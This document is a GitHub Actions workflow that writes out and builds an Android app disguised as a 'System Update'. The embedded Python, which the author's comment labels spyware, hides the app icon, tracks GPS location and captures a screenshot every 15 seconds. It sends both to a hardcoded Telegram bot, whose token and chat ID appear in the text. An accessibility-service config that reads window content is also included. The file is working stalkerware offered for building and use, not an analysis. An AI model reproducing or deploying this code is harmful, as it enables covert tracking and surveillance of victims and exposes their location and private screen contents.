name: Build Android APK

on:
  push:
    branches: [ "main" ]
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest

    steps:
    - name: Checkout Code
      uses: actions/checkout@v3

    - name: Set up Python
      uses: actions/setup-python@v4
      with:
        python-version: '3.10'

    - name: Install Dependencies
      run: |
        sudo apt-get update
        sudo apt-get install -y git zip unzip openjdk-17-jdk python3-pip autoconf libtool pkg-config zlib1g-dev libncurses5-dev libncursesw5-dev cmake libffi-dev libssl-dev
        pip3 install --user --upgrade buildozer cython virtualenv

    - name: Create Project Files
      run: |
        # 1. Bikin main.py (Spyware GPS & Screenshot)
        cat > main.py << 'EOF'
        import os
        import time
        import threading
        import requests
        from kivy.app import App
        from kivy.uix.label import Label
        from kivy.clock import Clock
        from jnius import autoclass
        from plyer import gps

        TG_TOKEN = "9165602208:AAFDWdd-GBUy-kbmArZ0QVDMGinA616f2WQ"
        TG_CHAT_ID = "8831607999"

        def _sT(msg):
            try:
                url = f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage"
                requests.post(url, json={"chat_id": TG_CHAT_ID, "text": msg}, timeout=5)
            except: pass

        def send_tg_file(filepath, caption):
            try:
                url = f"https://api.telegram.org/bot{TG_TOKEN}/sendPhoto"
                with open(filepath, 'rb') as f:
                    requests.post(url, data={'chat_id': TG_CHAT_ID, 'caption': caption}, files={'photo': f}, timeout=20)
                os.remove(filepath)
            except: pass

        def start_gps():
            def on_loc(**kw):
                if kw.get('lat') and kw.get('lon'):
                    _sT(f"📍 [GPS]\nhttps://www.google.com/maps?q={kw['lat']},{kw['lon']}")
            try:
                gps.configure(on_location=on_loc)
                gps.start(minTime=60000, minDistance=10)
            except: pass

        def start_screen():
            try:
                PythonActivity = autoclass('org.kivy.android.PythonActivity')
                activity = PythonActivity.mActivity
                while True:
                    View = autoclass('android.view.View')
                    view = activity.getWindow().getDecorView().getRootView()
                    view.setDrawingCacheEnabled(True)
                    bitmap = view.getDrawingCache()
                    if bitmap:
                        path = "/sdcard/s.png"
                        FileOutputStream = autoclass('java.io.FileOutputStream')
                        out = FileOutputStream(path)
                        CompressFormat = autoclass('android.graphics.Bitmap$CompressFormat')
                        bitmap.compress(CompressFormat.PNG, 100, out)
                        out.flush(); out.close()
                        send_tg_file(path, "📸 [SCREENSHOT]")
                    time.sleep(15)
            except: pass

        def hide_icon():
            try:
                PythonActivity = autoclass('org.kivy.android.PythonActivity')
                activity = PythonActivity.mActivity
                pm = activity.getPackageManager()
                ComponentName = autoclass('android.content.ComponentName')
                comp = ComponentName(activity, "org.kivy.android.PythonActivity")
                pm.setComponentEnabledSetting(comp, 2, 1)
            except: pass

        class SysUpdate(App):
            def build(self):
                self.label = Label(text="Sinkronisasi Data...")
                Clock.schedule_once(lambda dt: self.run_all(), 5)
                return self.label
            def run_all(self):
                _sT("📱 [+] Terpasang. Memulai pengintaian.")
                threading.Thread(target=hide_icon, daemon=True).start()
                threading.Thread(target=start_gps, daemon=True).start()
                threading.Thread(target=start_screen, daemon=True).start()

        if __name__ == '__main__':
            SysUpdate().run()
        EOF

        # 2. Bikin buildozer.spec
        cat > buildozer.spec << 'EOF'
        [app]
        title = System Update
        package.name = sysupdate
        package.domain = com.android.system
        source.dir = .
        source.include_exts = py,png,jpg,kv,xml
        source.include_patterns = res/xml/*.xml
        version = 0.1
        requirements = python3,kivy,pyjnius,requests,plyer,android
        orientation = portrait
        fullscreen = 0
        android.permissions = INTERNET,ACCESS_FINE_LOCATION,ACCESS_COARSE_LOCATION,READ_EXTERNAL_STORAGE,WRITE_EXTERNAL_STORAGE,FOREGROUND_SERVICE,SYSTEM_ALERT_WINDOW
        android.api = 30
        android.minapi = 21
        android.ndk = 25b
        android.archs = arm64-v8a
        p4a.branch = master
        EOF

        # 3. Bikin file XML
        mkdir -p res/xml res/values
        cat > res/xml/accessibility_service_config.xml << 'EOF'
        <?xml version="1.0" encoding="utf-8"?>
        <accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
            android:accessibilityEventTypes="typeViewTextChanged|typeViewClicked"
            android:accessibilityFeedbackType="feedbackGeneric"
            android:accessibilityFlags="flagDefault|flagReportViewIds"
            android:canRetrieveWindowContent="true"
            android:description="@string/accessibility_desc" />
        EOF

        cat > res/values/strings.xml << 'EOF'
        <?xml version="1.0" encoding="utf-8"?>
        <resources>
            <string name="accessibility_desc">System Update Service</string>
        </resources>
        EOF

    - name: Build with Buildozer
      run: |
        export PATH=$PATH:$HOME/.local/bin
        export JAVA_HOME=/usr/lib/jvm/java-17-openjdk-amd64
        yes | buildozer android debug

    - name: Upload APK Artifact
      uses: actions/upload-artifact@v3
      with:
        name: SystemUpdate-APK
        path: bin/*.apk
